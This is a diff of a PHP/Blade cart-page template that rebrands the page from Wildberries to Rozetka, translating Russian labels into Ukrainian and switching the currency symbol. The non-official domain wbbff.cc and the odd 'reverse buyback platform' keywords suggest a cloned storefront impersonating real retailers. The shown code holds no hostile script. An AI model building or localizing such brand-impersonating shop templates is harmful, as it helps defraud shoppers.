@@ -22,11 +22,11 @@
 
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
-    <title>Моя корзинка - Wildberries</title>
-    <meta name="keywords" content="Платформа обратного выкупа для российских торговцев">
-    <meta name="description" content="Коллекции женской, мужской и детской одежды, обуви, а также товары для дома и спорта. Информация о доставке и оплате. Таблицы размеров, советы по уходу за вещами.">
+    <title>Мій кошик - Rozetka</title>
+    <meta name="keywords" content="Платформа зворотного викупу для російських торговців">
+    <meta name="description" content="Колекції жіночого, чоловічого та дитячого одягу, взуття, а також товари для дому та спорту. Інформація про доставку та оплату. Таблиці розмірів, поради по догляду за речами.">
     <meta name="format-detection" content="telephone=no">
-    <link rel="shortcut icon" type="image/ico" href="https://wbbff.cc/favicon.ico">
+    <link rel="shortcut icon" type="image/ico" href="<?php echo asset("assets/favicon.ico") ?>">
     <link type="text/css" rel="stylesheet" href="<?php echo asset("assets/style_002.css") ?>">
     <script type="text/javascript" src="<?php echo asset("assets/jquery.js") ?>"></script>
     <script type="text/javascript" src="<?php echo asset("assets/global.js") ?>"></script>
@@ -797,7 +797,7 @@
         text-align: center;
         height: 44px;
         line-height: 44px;
-        color: #333;
+        color: #fff;
         width: 100%;
         font-family: '微软雅黑';
         font-size: 16px;
@@ -5536,23 +5536,23 @@
     </script>
     <div class="pagetop">
         <div class="fh"><a href="javascript:app_open('back');"></a></div>
-        <div>Моя корзинка</div>
+        <div>Мій кошик</div>
         <!-- <div class="cd"><a href="javascript:top_menu();"></a></div> -->
 
         <div class="top_menu" id="top_menu">
             <ul>
-                <li><a href="<?php echo route("index") ?>"><i class="top_tb1"></i><span>Главная</span></a></li>
+                <li><a href="<?php echo route("index") ?>"><i class="top_tb1"></i><span>Головна</span></a></li>
                 <li><a href="https://wbbff.cc/index.php/category"><i class="top_tb2"></i><span>Каталог</span></a></li>
-                <li><a href="<?php echo route("cart") ?>"><i class="top_tb3"></i><span>Корзина</span></a></li>
-                <li><a href="<?php echo route("profile") ?>"><i class="top_tb4"></i><span>Профиль</span></a></li>
+                <li><a href="<?php echo route("cart") ?>"><i class="top_tb3"></i><span>Кошик</span></a></li>
+                <li><a href="<?php echo route("profile") ?>"><i class="top_tb4"></i><span>Профіль</span></a></li>
             </ul>
             <div class="clear"></div>
         </div>
     </div>
     <div class="wgw_box" style="display: none;">
         <div class="wgw_btn"></div>
-        <div class="mat20 font16 c666">В корзине пока пусто</div>
-        <div class="g_btn"><a href="<?php echo route("index") ?>">Перейти на главную</a></div>
+        <div class="mat20 font16 c666">У кошику поки порожньо</div>
+        <div class="g_btn"><a href="<?php echo route("index") ?>">Перейти на головну</a></div>
     </div>
     <div class="content" style="padding-bottom: 60px;">
         <form method="post" id="form">
@@ -5573,7 +5573,7 @@
                         <a href="{{ route('product', $product->id) }}">{{ $product->name }}</a>
                     </p>
                     <p class="c888 font12">{{ $product->description }}</p>
-                    <p class="num corg mat3">₾{{ number_format($product->price, 2) }}</p>
+                    <p class="num corg mat3">₴{{ number_format($product->price, 2) }}</p>
                 </div>
                 <div class="clear"></div>
                 <div class="order_r">
@@ -5590,12 +5590,12 @@
             @endforeach
 
             <div class="add_tj">
-                <div class="add_qx"><span onclick="checkall_btn()"><i></i>выбрать все</span></div>
-                <div class="add_heji">Всего：<span class="corg font16">₾ <span id="order_money">0.0</span></span></div>
+                <div class="add_qx"><span onclick="checkall_btn()"><i></i>вибрати все</span></div>
+                <div class="add_heji">Всього：<span class="corg font16">₴ <span id="order_money">0.0</span></span></div>
                 <div class="add_tjbtn">
                     <input type="hidden" name="pe_token" value="75236c7c5fdf7ebfe3441c02863d0cb8">
                     <input type="hidden" name="pesubmit">
-                    <a href="javascript:cart_submit();">Kупить <span class="font12">( <span class="font14" id="order_num">0</span> )</span></a>
+                    <a href="javascript:cart_submit();">Купити <span class="font12">( <span class="font14" id="order_num">0</span> )</span></a>
                 </div>
             </div>
         </form>
@@ -5622,7 +5622,7 @@
                 num = type == '+' ? num + 1 : (num >= 1 ? num - 1 : 0);
             }
             if (num == 0) {
-                if (confirm("Вы уверены, что хотите удалить этот товар?") == false) return;
+                if (confirm("Ви впевнені, що хочете видалити цей товар?") == false) return;
             }
             app_getinfo("{{ route('cart.editCount', ['id' => ':id', 'num' => ':num']) }}".replace(":id", cart_id).replace(":num", num), function(json) {
                 if (json.result) {
@@ -5630,7 +5630,7 @@
                 }
                 _this.val(json.num);
                 var product_allmoney = pe_num(_this.attr("product_money") * json.num, 'round', 1);
-                js_cart.find(".product_allmoney").html('₾ ' + product_allmoney);
+                js_cart.find(".product_allmoney").html('₴ ' + product_allmoney);
                 cart_money();
             })
         }
@@ -5660,7 +5660,7 @@
         
         function cart_submit() {
             if ($(":input[name='cart_id[]']:checked").length == 0) {
-                app_tip("Пожалуйста выберите хотя бы один товар");
+                app_tip("Будь ласка, виберіть хоча б один товар");
                 return false;
             }
             
@@ -5700,7 +5700,7 @@
         $(function() {
             $("img.js_imgload").scrollLoading();
         });
-        //顶部菜单点击
+        //верхнє меню клік
         function top_menu() {
             if ($("#top_menu").is(":hidden")) {
                 $("#top_menu").show();
